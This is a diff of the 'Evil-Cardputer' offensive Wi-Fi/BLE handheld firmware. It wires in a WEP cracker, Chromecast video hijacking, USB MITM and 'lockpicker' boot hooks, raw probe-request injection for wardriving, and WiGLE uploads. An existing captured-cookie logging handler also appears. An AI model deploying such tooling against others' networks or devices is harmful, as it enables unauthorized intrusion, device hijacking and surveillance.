@@ -213,6 +213,9 @@ void wifiRadarMenu();
 void smbDiscoverMenu();
 void poisonMeshMenu();
 void poisonCoreMenu();
+#include <IPAddress.h>
+namespace castv2 { static int flingYouTube(IPAddress ip, const String& videoId, String& log); }  // fwd (def dans src/castv2.h, meme TU)
+void castEnsureDefaultVideos();           // fwd (def dans src/casting.h, meme TU)
 void smbSerialDiscover();                 // headless: list SMB (445) hosts over serial
 void smbSerialTest(const String& ipStr);  // headless: full SMB2 pipeline w/ verbose serial
 void smbSerialLs(const String& args);     // headless: list a dir on a share
@@ -275,6 +278,10 @@ static volatile bool g_relay_stop = false;
 static volatile bool g_relay_active = false;
 static volatile int  g_launch = 0;       // 0=none, 1=relayB, 2=vcardA (set by serial, run by loop())
 static volatile int  g_launch_prof = 0;
+// Etat live du wardriving, expose a la commande serie "wdstat" (verif AP reels captures + heap).
+static volatile bool     g_wdRunning = false;
+static volatile uint32_t g_wdUniq = 0, g_wdTotal = 0, g_wdApDrop = 0;
+static volatile int      g_wdN = 0, g_wdDn = 0;
 static void rly_on_recv(const uint8_t* mac, const uint8_t* data, int len);
 static void rly_send(uint8_t type, uint8_t seq, const uint8_t* payload, int len);
 static bool rly_begin();
@@ -437,6 +444,13 @@ static const char * const PROGMEM menuItems[] = {
   "CSA Attack",
   "WPA3 SAE",
   "MITM Proxy",
+  "Casting Chrome",
+  "Wigle",
+  "Geofences",
+  "BitchatPoison",
+  "Lockpicker",
+  "LED-B-Gone",
+  "WEP Cracker",
   "Settings",
 };
 
@@ -1711,7 +1725,11 @@ void crash_boot_log() {
 // as the MJPEG viewer (JPEG decode + sprite) were overflowing it -> crash.
 SET_LOOP_TASK_STACK_SIZE(16 * 1024);
 
+void lockpickerBootHook();  // fwd decl (defini dans src/lockpicker.h, inclus plus bas)
+namespace mitm { void usbBootHook(); }   // fwd decl (defini dans src/mitm_proxy.h) : gadget USB MITM
 void setup() {
+  lockpickerBootHook();   // si mode gadget lockpicker arme (flag NVS): prend la main avant tout init USB, ne revient pas
+  mitm::usbBootHook();    // si mode gadget USB-MITM arme: prend la main avant tout init USB, ne revient pas
   Serial.begin(115200);
   M5.begin();
   M5.Lcd.setRotation(1);
@@ -2188,7 +2206,7 @@ void setup() {
   // Textes à afficher
   const char* text1 = "Evil-Cardputer";
   const char* text2 = "By 7h30th3r0n3";
-  const char* text3 = "v1.5.8 2026";
+  const char* text3 = "v1.5.9 2026";
 
   // Mesure de la largeur du texte et calcul de la position du curseur
   int text1Width = M5.Lcd.textWidth(text1);
@@ -2218,7 +2236,7 @@ void setup() {
   Serial.println(F("-------------------"));
   Serial.println(F("Evil-Cardputer"));
   Serial.println(F("By 7h30th3r0n3"));
-  Serial.println(F("v1.5.8 2026"));
+  Serial.println(F("v1.5.9 2026"));
   Serial.println(F("-------------------"));
   // Diviser randomMessage en deux lignes pour s'adapter à l'écran
   int maxCharsPerLine = screenWidth / 10;  // Estimation de 10 pixels par caractère
@@ -2603,8 +2621,10 @@ void loop() {
     }
   }
 
-  // Mettre à jour la barre de tâches indépendamment du menu
-  if (currentMillis - lastTaskBarUpdateTime >= taskBarUpdateInterval && inMenu) {
+  // Mettre à jour la barre de tâches indépendamment du menu.
+  // lastIndex == -1 => redraw complet demande (retour de module) : on repeint AUSSI la taskbar
+  // tout de suite, sinon elle garde les pixels du module (ghosting du divider) jusqu'au prochain tick.
+  if (((currentMillis - lastTaskBarUpdateTime >= taskBarUpdateInterval) || lastIndex == -1) && inMenu) {
     drawTaskBar();
     lastTaskBarUpdateTime = currentMillis;
   }
@@ -2818,14 +2838,15 @@ void drawMenu() {
   int reserveBottom = (menuMode == MENU_SEARCH) ? SEARCH_BAR_H : 0;
   int listH = (M5.Display.height() - MENU_TOP_Y) - reserveBottom;
 
-  // Efface uniquement la zone liste (pas la barre search)
-  M5.Display.fillRect(0, MENU_TOP_Y, M5.Display.width(), listH, menuBackgroundColor);
+  // Efface la zone liste (depuis y=12 : couvre la ligne morte sous le divider violet
+  // -> pas de ghosting d'un module qui aurait dessine en y=12)
+  M5.Display.fillRect(0, 12, M5.Display.width(), listH + (MENU_TOP_Y - 12), menuBackgroundColor);
 
   M5.Display.setTextSize(menuTextSize);
   M5.Display.setTextFont(1);
 
   const int startX = 5;
-  const int startY = 10;
+  const int startY = 13;   // decale la liste vers le bas -> respiration sous le divider violet
 
   const int total = viewCount();  // respecte SEARCH + lock 
 
@@ -2836,9 +2857,10 @@ void drawMenu() {
     int menuIndex = mapViewToRealIndex(pos); // respecte filtre 
 
     if (pos == currentIndex) {
-      M5.Display.fillRect(0, 1 + startY + i * menuLineH,
-                          M5.Display.width(), menuLineH,
-                          menuSelectedBackgroundColor);
+      int ry = 1 + startY + i * menuLineH;
+      int rh = menuLineH;
+      if (ry < MENU_TOP_Y) { rh -= (MENU_TOP_Y - ry); ry = MENU_TOP_Y; }  // ne pas empieter sur la taskbar/divider violet
+      M5.Display.fillRect(0, ry, M5.Display.width(), rh, menuSelectedBackgroundColor);
       M5.Display.setTextColor(menuTextFocusedColor);
     } else {
       M5.Display.setTextColor(menuTextUnFocusedColor);
@@ -2869,7 +2891,15 @@ namespace drone { void menu(); void console(String a); }   // Drone RemoteID det
 namespace csa   { void menu(); void console(String a); }   // CSA (channel switch) attack
 namespace sae   { void menu(); void console(String a); }   // WPA3 / SAE toolkit
 namespace mitm  { void menu(); }                            // MITM proxy (AP+STA userspace relay)
+namespace wep   { void menu(); }                            // WEP Cracker (detect+capture IV+ARP replay, src/wep_crack.h)
 
+void castingMenu();  // fwd decl (Casting, defini dans src/casting.h)
+void wigleMenu();          // src/wigle_geofence.h
+void geofenceMenu();       // src/wigle_geofence.h
+static int wigleUpload(const char* csvPath, String& outMsg);   // src/wigle_geofence.h (pour la commande serie wigle_up)
+void bitchatPoisonMenu();  // src/bitchat_poison.h
+void lockpickerMenu();     // src/lockpicker.h
+void ledbgoneMenu();       // src/ledbgone.h  (LED-B-Gone : TV-B-Gone BLE)
 void executeMenuItem(int index) {
   inMenu = false;
   isOperationInProgress = true;
@@ -2884,7 +2914,10 @@ void executeMenuItem(int index) {
   if (index == 104) { csa::menu();     isOperationInProgress = false; inMenu = true; return; }
   if (index == 105) { sae::menu();     isOperationInProgress = false; inMenu = true; return; }
   if (index == 106) { mitm::menu();    isOperationInProgress = false; inMenu = true; return; }
-  if (index > 106) index -= 6;        // Settings (display 107) -> original switch case 101
+  if (index == 113) { wep::menu();     isOperationInProgress = false; inMenu = true; return; } // WEP Cracker (display 113)
+  // Settings deplace en dernier (display 114) -> case 101 ; Casting..LED-B-Gone (107..112) -> cases 102..107.
+  if (index == 114) index = 101;      // Settings (desormais dernier item) -> showSettingsMenu (case 101)
+  else if (index > 106) index -= 5;   // Casting Chrome..LED-B-Gone (display 107..112) -> switch 102..107
   else if (index > 91) index -= 1;    // WhisperPair..PoisonCore (display 92..101) -> switch 91..100
   switch (index) {
     case 0:  scanWifiNetworks(); break;
@@ -2989,6 +3022,15 @@ void executeMenuItem(int index) {
     case 99: poisonMeshMenu(); break;
     case 100: poisonCoreMenu(); break;
     case 101: showSettingsMenu(); break;
+    // Nouveaux modules : ils ne restaurent pas inMenu en interne (contrairement aux anciens)
+    // -> on le remet a true ici, sinon inMenu reste false et le main loop retombe dans
+    //    probeSniffing au retour. Fix du "on se retrouve dans le sniff probes".
+    case 102: castingMenu();       inMenu = true; break;
+    case 103: wigleMenu();         inMenu = true; break;
+    case 104: geofenceMenu();      inMenu = true; break;
+    case 105: bitchatPoisonMenu(); inMenu = true; break;
+    case 106: lockpickerMenu();    inMenu = true; break;
+    case 107: ledbgoneMenu();      inMenu = true; break;
   }
   isOperationInProgress = false;
 }
@@ -3159,8 +3201,9 @@ void handleMenuInput() {
 
   } else if (kp(KEY_ENTER)) {
     int realIndex = mapViewToRealIndex(currentIndex);
+    enterDebounce();              // attend le relache AVANT d'entrer -> le sous-menu ne voit pas ENTER maintenu (fin de l'auto-selection du 1er item)
     executeMenuItem(realIndex);
-    needsEnterDebounce = true;
+    needsEnterDebounce = true;    // et re-debounce au retour du module
     stateChanged = true;
     keyHandled = true;
 
@@ -3560,14 +3603,24 @@ void checkSerialCommands() {
     String command = Serial.readStringUntil('\n');
     command.trim();
     if (command == "ping") { Serial.println("[SER] pong"); return; }
-    if (command == "version") { if (g_jsonOut) Serial.println(F("{\"fw\":\"v1.5.8\",\"year\":2026}")); else Serial.println(F("Evil-Cardputer firmware v1.5.8 2026")); return; }
+    if (command == "version") { if (g_jsonOut) Serial.println(F("{\"fw\":\"v1.5.9\",\"year\":2026}")); else Serial.println(F("Evil-Cardputer firmware v1.5.9 2026")); return; }
     if (command == "relayb") { if (!g_relay_active) g_launch = 1; return; }     // launched by loop(), not here (avoid re-entrancy)
     if (command.startsWith("vcard")) { if (!g_relay_active) { g_launch_prof = command.substring(5).toInt(); g_launch = 2; } return; }
     if (command == "relaystop") { g_relay_stop = true; return; }
     if (command == "relaylog clear") { SD.remove("/evil/relay_log.txt"); Serial.println("[RELAYLOG] cleared"); return; }
+    if (command.startsWith("set_wigle ")) {   // ecrit les identifiants API Wigle sur la SD (FatFs : ignore le FAT "dirty"/RO)
+        String creds = command.substring(10); creds.trim();
+        if (creds.indexOf(':') < 0) { Serial.println(F("[WIGLE] format: set_wigle apiname:token")); return; }
+        SD.mkdir("/evil"); SD.mkdir("/evil/wardriving");
+        SD.remove("/evil/wardriving/wigle.txt");
+        File f = SD.open("/evil/wardriving/wigle.txt", FILE_WRITE);
+        if (f) { f.println(creds); f.close(); Serial.println(F("[WIGLE] wrote /evil/wardriving/wigle.txt")); }
+        else Serial.println(F("[WIGLE] SD write failed"));
+        return;
+    }
     if (command == "relaylog") {
         File f = SD.open("/evil/relay_log.txt", FILE_READ);
-        if (!f) { Serial.println("[RELAYLOG] no file (appuie BACK apres le test pour ecrire)"); return; }
+        if (!f) { Serial.println("[RELAYLOG] no file (press BACK after the test to write)"); return; }
         Serial.printf("[RELAYLOG] === %d bytes ===\n", (int)f.size());
         uint8_t buf[256]; int n;
         while ((n = f.read(buf, sizeof(buf))) > 0) { Serial.write(buf, n); Serial.flush(); }
@@ -3659,6 +3712,34 @@ void checkSerialCommands() {
     if (command == "scan_hosts")  { runByName("Scan Network Hosts"); return; }
     if (command == "scan_full")   { runByName("Scan Network Full");  return; }
     if (command == "wardrive")    { runByName("Wardriving");         return; }
+    if (command == "wdstat") {   // etat live du wardriving (AP uniques captures, cap, heap) -> verif sans GPS
+      Serial.printf("[WDSTAT] running=%d uniq=%lu total=%lu apDrop=%lu wdN=%d dedup=%d heap=%u min=%u\n",
+                    g_wdRunning ? 1 : 0, (unsigned long)g_wdUniq, (unsigned long)g_wdTotal, (unsigned long)g_wdApDrop,
+                    g_wdN, g_wdDn, (unsigned)ESP.getFreeHeap(), (unsigned)ESP.getMinFreeHeap());
+      return;
+    }
+    if (command.startsWith("wigle_up")) {    // upload d'un CSV wardriving vers l'API Wigle (sans la nav ecran)
+      String arg = command.substring(8); arg.trim();
+      String path;
+      if (arg.length()) {                     // nom fourni (avec ou sans .csv)
+        if (!arg.startsWith("/")) path = "/evil/wardriving/" + arg; else path = arg;
+        if (!path.endsWith(".csv") && !path.endsWith(".wiglecsv") && !SD.exists(path)) path += ".csv";
+      } else {                                // sinon : derniere session wardriving-0N.csv
+        File rt = SD.open("/evil/wardriving"); int mx = -1; String best;
+        if (rt) { for (File e = rt.openNextFile(); e; e = rt.openNextFile()) {
+            String nm = e.name(); int sl = nm.lastIndexOf('/'); if (sl >= 0) nm = nm.substring(sl + 1);
+            String lo = nm; lo.toLowerCase();
+            if (lo.endsWith(".csv") || lo.endsWith(".wiglecsv")) { int s = nm.indexOf('-') + 1, en = nm.indexOf('.'); int fi = (s > 0 && en > s) ? nm.substring(s, en).toInt() : 0; if (fi > mx) { mx = fi; best = nm; } }
+            e.close(); } rt.close(); }
+        if (best.length()) path = "/evil/wardriving/" + best;
+      }
+      if (!path.length() || !SD.exists(path)) { Serial.println(F("[WIGLE] usage: wigle_up [fichier.csv]  (defaut: derniere session) ; fichier introuvable")); return; }
+      if (WiFi.status() != WL_CONNECTED) { Serial.println(F("[WIGLE] WiFi non connecte (wifi_connect <ssid> [pass])")); return; }
+      Serial.printf("[WIGLE] upload %s ...\n", path.c_str());
+      String msg; int code = wigleUpload(path.c_str(), msg);   // instrumente : imprime [WIGLE] fsz/wrote/clen/code + resp
+      Serial.printf("[WIGLE] done code=%d : %s\n", code, msg.c_str());
+      return;
+    }
 
     // ── WiFi (STA) ──
     if (command.startsWith("wifi_connect")) {
@@ -3684,6 +3765,29 @@ void checkSerialCommands() {
       return;
     }
     if (command == "wifi_disconnect") { WiFi.disconnect(); Serial.println(F("[WiFi] Disconnected")); return; }
+
+    // ── regenere /evil/casting/casting_videos.txt avec la liste par defaut (hacking/Evil-M5) ──
+    if (command == "cast_reset_videos") {
+      SD.remove("/evil/casting/casting_videos.txt");
+      castEnsureDefaultVideos();
+      Serial.println(F("[CAST] /evil/casting/casting_videos.txt regenere (liste par defaut)"));
+      return;
+    }
+
+    // ── Cast v2 (Chromecast) : castv2 <ip> [videoId]  -> LAUNCH YouTube + flingVideo ──
+    if (command.startsWith("castv2")) {
+      String rest = command.substring(6); rest.trim();
+      int sp = rest.indexOf(' ');
+      String ipS = (sp >= 0) ? rest.substring(0, sp) : rest;
+      String vid = (sp >= 0) ? rest.substring(sp + 1) : "dQw4w9WgXcQ";   // def rickroll
+      ipS.trim(); vid.trim();
+      IPAddress ip;
+      if (!ip.fromString(ipS)) { Serial.println(F("Usage: castv2 <ip> [videoId]")); return; }
+      if (WiFi.status() != WL_CONNECTED) { Serial.println(F("[CV2] WiFi non connecte (wifi_connect d'abord)")); return; }
+      String lg; int rc = castv2::flingYouTube(ip, vid, lg);
+      Serial.printf("[CV2] rc=%d  %s\n", rc, lg.c_str());
+      return;
+    }
 
     if (command == "arp_dump") {
       esp_netif_t* staIf = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
@@ -4054,6 +4158,9 @@ void checkSerialCommands() {
       Serial.println(F("[GPS / CCTV]"));
       Serial.println(F("  gps_status"));
       Serial.println(F("  mjpeg_list / mjpeg <index|url>  - view CCTV MJPEG stream"));
+      Serial.println(F("[CASTING] (Chromecast / Cast v2)"));
+      Serial.println(F("  castv2 <ip> [videoId]    - cast a YouTube video to a TV"));
+      Serial.println(F("  cast_reset_videos        - reset the SD preset video list"));
       Serial.println(F("[HW I/O] (Grove G1=1, G2=2)"));
       Serial.println(F("  gpio mode|read|write <pin> ... / adc <pin> / pwm <pin> <duty> [freq]"));
       Serial.println(F("  led <r> <g> <b> | led off"));
@@ -4092,6 +4199,12 @@ void checkSerialCommands() {
       Serial.println(F("  arp_dump                 - dump the live ARP table"));
       Serial.println(F("  sd_head <path> [n]       - hexdump first n bytes of an SD file"));
       Serial.println(F("  sd_rm <path>             - delete an SD file"));
+      Serial.println(F("  sd ls [path]             - list an SD directory (default /)"));
+      Serial.println(F("  sd cat <file>            - print an SD file"));
+      Serial.println(F("  sd append <file> <text>  - add a line to an SD file"));
+      Serial.println(F("  sd write <file> <text>   - overwrite an SD file with one line"));
+      Serial.println(F("  sd rm|mkdir|rmdir <path> - delete file / make or remove a dir"));
+      Serial.println(F("  set_wigle apiname:token  - save Wigle API creds to SD"));
       Serial.println(F("[NFC / BLE CONSOLES]  (type '<name> help' for subcommands)"));
       Serial.println(F("  nfc <cmd>       - mini-PM3 HF: search/read/mfc/emv/ul/desfire/apdu/raw/reg/field"));
       Serial.println(F("  nfcb <cmd>      - Calypso/ISO-B debug: strategies/dump/decode/scan/apdu/reg"));
@@ -4207,7 +4320,7 @@ void changePortal(int index) {
 void selectNetwork(int index) {
   if (index >= 0 && index < numSsid) {
     currentlySelectedSSID = ssidList[index];
-    Serial.println("SSID sélectionné: " + currentlySelectedSSID);
+    Serial.println("Selected SSID: " + currentlySelectedSSID);
   } else {
     Serial.println(F("Index SSID invalide."));
   }
@@ -4675,7 +4788,7 @@ void handleLogRequest() {
   String paramDomain = server.arg("domain");
 
   if (cookies.isEmpty()) {
-    Serial.println(F("Requête ignorée : cookies vides."));
+    Serial.println(F("Request ignored: empty cookies."));
     server.send(204, "text/plain", ""); // Réponse vide
     return;
   }
@@ -7769,7 +7882,7 @@ void probeSniffing() {
   isProbeSniffingRunning = true;
   startScanKarma();
 
-  uint8_t channels[] = {1, 6, 11};
+  uint8_t channels[] = {1, 6, 11, 12, 13};  // ch 12-13 (ETSI/TELEC) - cf PR #122
   size_t channelIndex = 0;
   unsigned long lastHop = millis();
   const unsigned long hopInterval = 333; // 250 ms
@@ -7866,9 +7979,12 @@ void waitAndReturnToMenu(String message) {
 }
 
 
+bool g_loopOptionsBack = false;   // vrai si le dernier loopOptions a ete quitte par BACKSPACE (et non par une selection)
+
 void loopOptions(std::vector<std::pair<String, std::function<void()>>> &options, bool loop, bool displayTitle, const String &title = "") {
     int currentIndex = 0;
     bool selectionMade = false;
+    g_loopOptionsBack = false;
     const int lineHeight = 12;
     const int maxVisibleLines = 11;
     int menuStartIndex = 0;
@@ -7911,13 +8027,15 @@ void loopOptions(std::vector<std::pair<String, std::function<void()>>> &options,
             screenNeedsUpdate = true;
             delay(150); // anti-rebond
         } else if (kp(KEY_ENTER)) {
+            enterDebounce();            // attend le relache -> pas de double-activation ni d'ENTER propage a l'action
             options[currentIndex].second();
             if (!loop) {
                 selectionMade = true;
             }
         } else if (kp(KEY_BACKSPACE)) {
+            backDebounce();             // attend le relache -> pas de BACK propage au menu parent
             selectionMade = true;
-            delay(150); // anti-rebond
+            g_loopOptionsBack = true;   // signale au parent que la sortie vient d'un BACK
             waitAndReturnToMenu("Back to menu");
         }
 
@@ -7964,6 +8082,8 @@ advisories are public. Authorized use only - own networks or explicit permission
 #include "src/poison_radio.h"
 #include "src/poison_mesh.h"
 #include "src/poison_core.h"
+#include "src/wigle_geofence.h"   // Upload Wigle + geofences (greffe wardriving)
+#include "src/mapview.h"          // Vue carte offline (tuiles SD) + tracking GPS/GPX, appele depuis geofenceMenu
 
 struct PoisonEntry { const char* name; const char* detail; void (*action)(); };
 
@@ -8191,8 +8311,9 @@ void showSettingsMenu() {
         options.push_back({String("Power: Sleep after (") + powerSleepAfter + "s)", setPowerSleepAfter});
         
         loopOptions(options, false, true, "Settings");
-        // Vérifie si BACKSPACE a été pressé pour quitter le menu
-        if (kp(KEY_BACKSPACE)) {
+        // Sortie du menu Settings si loopOptions a ete quitte par BACKSPACE
+        // (kp(KEY_BACKSPACE) ici est toujours faux car backDebounce a deja attendu le relache)
+        if (g_loopOptionsBack) {
             continueSettingsMenu = false;
         }
     }
@@ -9750,8 +9871,10 @@ void packetSnifferKarma(void* buf, wifi_promiscuous_pkt_type_t type) {
   }
 
   if (frame_type == 0x40) { // Probe Request Frame
+    if (packet->rx_ctrl.sig_len < 27) return;   // trame trop courte pour contenir l'IE SSID (fix OOB, cf PR #122)
     uint8_t ssid_length_Karma = frame[25];
-    if (ssid_length_Karma >= 1 && ssid_length_Karma <= 32) {
+    if (ssid_length_Karma >= 1 && ssid_length_Karma <= 32 &&
+        packet->rx_ctrl.sig_len >= (uint16_t)(26 + ssid_length_Karma)) {
       char ssidKarma[33] = {0};
       memcpy(ssidKarma, &frame[26], ssid_length_Karma);
       ssidKarma[ssid_length_Karma] = '\0';
@@ -10673,7 +10796,7 @@ int currentChannel = 1;
 int originalChannel = 1;
 
 void setNextWiFiChannel() {
-  static const uint8_t channels[] = {1, 3, 6, 9, 11};
+  static const uint8_t channels[] = {1, 3, 6, 9, 11, 12, 13};  // ch 12-13 (ETSI/TELEC) - cf PR #122
   static size_t channelIndex = 0;
 
   channelIndex = (channelIndex + 1) % (sizeof(channels) / sizeof(channels[0]));
@@ -10740,8 +10863,10 @@ void autoKarmaPacketSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
   const uint8_t frame_type = frame[0];
 
   if (frame_type == 0x40) {
+    if (packet->rx_ctrl.sig_len < 27) return;   // fix OOB (cf PR #122)
     uint8_t ssid_length_Karma_Auto = frame[25];
-    if (ssid_length_Karma_Auto >= 1 && ssid_length_Karma_Auto <= 32) {
+    if (ssid_length_Karma_Auto >= 1 && ssid_length_Karma_Auto <= 32 &&
+        packet->rx_ctrl.sig_len >= (uint16_t)(26 + ssid_length_Karma_Auto)) {
       // Keep this WiFi-task callback featherweight (just like the original): copy
       // the SSID into one slot and raise a flag. The dedup + list append is done
       // in the app task (loopAutoKarma). Doing a spinlock + 48-entry strcmp loop
@@ -11117,9 +11242,9 @@ Wardriving
 
 String createPreHeader() {
   String preHeader = "WigleWifi-1.4";
-  preHeader += ",appRelease=v1.5.8"; // Remplacez [version] par la version de votre application
-  preHeader += ",model=Cardputer";
-  preHeader += ",release=v1.5.8"; // Remplacez [release] par la version de l'OS de l'appareil
+  preHeader += ",appRelease=v1.5.9"; // Remplacez [version] par la version de votre application
+  preHeader += ",model=Evil-Cardputer";
+  preHeader += ",release=v1.5.9"; // Remplacez [release] par la version de l'OS de l'appareil
   preHeader += ",device=Evil-Cardputer"; // Remplacez [device name] par un nom de périphérique, si souhaité
   preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
   preHeader += ",board=M5Cardputer";
@@ -11136,166 +11261,386 @@ double lat = 0.0, lng = 0.0, alt = 0.0; // Déclaration des variables pour la la
 float accuracy = 0.0; // Déclaration de la variable pour la précision
 
 
+// ---- Wardriving v2 : capture promiscuous (passif + stimulation active) ------------------------
+// Passif : ecoute beacons + probe responses sur chaque canal 1-13. Actif : injecte des probe
+// requests broadcast (SSID vide -> tous les AP repondent) pour stimuler des reponses. Le callback
+// ne touche NI SD NI ecran (anti-crash SPI) : il parse et empile dans un ring ; la boucle draine,
+// dedoublonne par BSSID et ecrit le CSV avec le fix GPS courant (lecture GPS non bloquante).
+#include <set>
+#define WD_CAPQ 24
+struct WdCap { uint8_t bssid[6]; char ssid[33]; uint8_t ch; int8_t rssi; uint8_t auth; };
+static WdCap*            wdQ = nullptr;
+static volatile uint8_t  wdHead = 0, wdTail = 0;
+static volatile uint32_t wdSeen = 0, wdDrop = 0;
+
+static const char* wdAuthWigle(uint8_t a) {   // 0 open 1 wep 2 wpa 3 wpa2 4 wpa2-eap 5 wpa3-sae 6 owe
+  switch (a) { case 1: return "[WEP][ESS]"; case 2: return "[WPA-PSK][ESS]";
+    case 3: return "[WPA2-PSK][ESS]"; case 4: return "[WPA2-EAP][ESS]";
+    case 5: return "[WPA3-SAE][ESS]"; case 6: return "[OWE][ESS]"; default: return "[OPEN][ESS]"; }
+}
+// Parse les IE du beacon/probe-resp : SSID, canal (DS param), et le mode d'auth via RSN(48)/WPA(221).
+static uint8_t wdParseAuth(const uint8_t* f, int len, uint8_t* chOut, char* ssid, int ssidsz) {
+  uint16_t cap = (len > 35) ? (f[34] | (f[35] << 8)) : 0;
+  bool priv = cap & 0x0010, rsn = false, wpa = false, dsSeen = false; int akm = 2;
+  if (ssidsz) ssid[0] = 0;
+  int pp = 36;
+  while (pp + 2 <= len) {
+    uint8_t tag = f[pp], l = f[pp + 1]; if (pp + 2 + (int)l > len) break;
+    const uint8_t* d = f + pp + 2;
+    if (tag == 0 && ssidsz) { int c = (l < ssidsz - 1) ? l : ssidsz - 1; for (int k = 0; k < c; k++) ssid[k] = (d[k] >= 32 && d[k] < 127) ? d[k] : '.'; ssid[c] = 0; }
+    // VRAI canal de l'AP : DS Parameter Set (tag 3) -> rx_ctrl.channel = juste le canal radio accorde,
+    // donc un AP d'un canal adjacent (ch3 capte sur ch6) serait mal etiquete. Fallback HT Operation (61).
+    else if (tag == 3 && l >= 1 && chOut && d[0] >= 1 && d[0] <= 14) { *chOut = d[0]; dsSeen = true; }
+    else if (tag == 61 && l >= 1 && chOut && !dsSeen && d[0] >= 1 && d[0] <= 14) *chOut = d[0];
+    else if (tag == 48 && l >= 8) { rsn = true; int o = 2 + 4; if (o + 2 <= l) { int pc = d[o] | (d[o + 1] << 8); o += 2 + 4 * pc; } if (o + 2 <= l) { int ac = d[o] | (d[o + 1] << 8); o += 2; if (ac >= 1 && o + 4 <= l) akm = d[o + 3]; } }
+    else if (tag == 221 && l >= 4 && d[0] == 0x00 && d[1] == 0x50 && d[2] == 0xF2 && d[3] == 0x01) wpa = true;
+    pp += 2 + l;
+  }
+  if (rsn) { if (akm == 8 || akm == 9) return 5; if (akm == 18) return 6; if (akm == 1 || akm == 3 || akm == 11 || akm == 13) return 4; return 3; }
+  if (wpa) return 2;
+  if (priv) return 1;
+  return 0;
+}
+static void wdSnifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
+  wdSeen++;
+  if (type != WIFI_PKT_MGMT || !wdQ) return;
+  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
+  const uint8_t* f = pkt->payload; int len = pkt->rx_ctrl.sig_len;
+  if (len < 36) return;
+  uint8_t sub = (f[0] & 0xF0) >> 4;
+  if (sub != 0x08 && sub != 0x05) return;              // beacon (8) ou probe response (5)
+  uint8_t next = (wdHead + 1) % WD_CAPQ;
+  if (next == wdTail) { wdDrop++; return; }
+  WdCap& c = wdQ[wdHead];
+  memcpy(c.bssid, f + 16, 6);                          // BSSID (addr3)
+  c.ch = pkt->rx_ctrl.channel; c.rssi = pkt->rx_ctrl.rssi;
+  c.auth = wdParseAuth(f, len, &c.ch, c.ssid, sizeof c.ssid);
+  wdHead = next;
+}
+static void wdTxProbe(const char* ssid) {              // probe request (broadcast si ssid==NULL/"")
+  uint8_t fr[160]; int n = 0;
+  fr[n++] = 0x40; fr[n++] = 0x00; fr[n++] = 0x00; fr[n++] = 0x00;
+  for (int i = 0; i < 6; i++) fr[n++] = 0xff;          // DA broadcast
+  fr[n++] = 0x24; fr[n++] = 0x06; fr[n++] = 0x12;
+  fr[n++] = (uint8_t)random(256); fr[n++] = (uint8_t)random(256); fr[n++] = (uint8_t)random(256);  // SA random
+  for (int i = 0; i < 6; i++) fr[n++] = 0xff;          // BSSID broadcast
+  fr[n++] = 0x00; fr[n++] = 0x00;                       // seq
+  int sl = ssid ? (int)strlen(ssid) : 0; if (sl > 32) sl = 32;
+  fr[n++] = 0x00; fr[n++] = (uint8_t)sl; for (int i = 0; i < sl; i++) fr[n++] = ssid[i];            // SSID IE
+  static const uint8_t rates[] = {0x01,0x08,0x02,0x04,0x0b,0x16,0x0c,0x12,0x18,0x24};
+  memcpy(fr + n, rates, sizeof rates); n += sizeof rates;
+  esp_wifi_80211_tx(WIFI_IF_STA, fr, n, false);
+}
+
+#include <map>
+#include <algorithm>
+// ---- Wardriving v2 : modele d'AP pour l'UI multi-pages (alloue au heap -> 0 RAM boot) ----------
+static const char* WD_SORT_NAME[4] = { "recent", "RSSI", "canal", "SSID" };
+struct WdAp { uint8_t bssid[6]; char ssid[34]; uint8_t ch; int8_t rssi; uint8_t auth; uint32_t first, last; float lat, lon; };
+#define WD_MAX 200            /* AP avec enregistrement COMPLET (liste/carte) */
+#define WD_EXACT_MAX 256      /* dedup EXACTE (dkey/dval) : AP ayant un slot d'affichage + un peu de marge */
+#define WD_BLOOM_BITS 65536u  /* filtre de Bloom (8 Ko) : dedup APPROX globale -> compte uniq + gate CSV ; ~7000 AP a ~1% FP => PLUS de blocage a 1200 */
+#define WD_BLOOM_K 6
+#define WD_HEAP_FLOOR 12000   /* plancher heap : garde ultime avant une ecriture CSV (device sans PSRAM) */
+static const char* WD_AUTH_SHORT[7] = { "OPN","WEP","WPA","WP2","EAP","WP3","OWE" };
+// Sequence de canaux PONDEREE : 1/6/11 (ou vivent ~tous les AP 2.4GHz) visites a chaque groupe, les
+// autres intercales -> capture REGULIERE au lieu de salves (le hop lineaire 1..13 passait ~75% du
+// temps sur des canaux vides, d'ou "une fois sur deux il ne capte rien, les AP arrivent en salve").
+static const uint8_t WD_CHSEQ[] = { 1,6,11, 2, 1,6,11, 3, 1,6,11, 4, 1,6,11, 5, 1,6,11, 7,
+                                    1,6,11, 8, 1,6,11, 9, 1,6,11, 10, 1,6,11, 12, 1,6,11, 13 };
+#define WD_CHSEQ_N ((int)(sizeof(WD_CHSEQ)/sizeof(WD_CHSEQ[0])))
+// Filtre de Bloom : test+set en une passe (retourne true si l'AP etait DEJA vu). FNV-1a + xorshift
+// (double hashing Kirsch-Mitzenmacher). Memoire fixe -> le compte d'uniques n'est plus borne a 1200.
+static inline bool wdBloomSeenThenAdd(uint8_t* bl, uint64_t id) {
+  uint32_t a = 2166136261u; for (int i = 0; i < 6; i++) { a ^= (uint8_t)(id >> (8 * (5 - i))); a *= 16777619u; }
+  uint32_t b = (uint32_t)(id ^ (id >> 32)); b ^= b << 13; b ^= b >> 17; b ^= b << 5; b |= 1u;
+  bool seen = true;
+  for (int i = 0; i < WD_BLOOM_K; i++) { uint32_t p = (a + (uint32_t)i * b) % WD_BLOOM_BITS; uint32_t idx = p >> 3; uint8_t m = (uint8_t)(1u << (p & 7));
+    if (!(bl[idx] & m)) { seen = false; bl[idx] |= m; } }
+  return seen;
+}
+
 void wardrivingMode() {
-  WiFi.mode(WIFI_STA);
-  WiFi.disconnect();
-  Serial.println(F("-------------------"));
-  Serial.println(F("Starting Wardriving"));
-  Serial.println(F("-------------------"));
-  M5.Lcd.fillScreen(menuBackgroundColor);
-  M5.Lcd.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
-  M5.Lcd.setTextSize(1.5);
-  M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_RED);
-  M5.Display.setCursor(M5.Display.width() / 2 - 24 , M5.Display.height() - 20);
-  M5.Display.setTextColor(TFT_WHITE);
-  M5.Display.println("Stop");
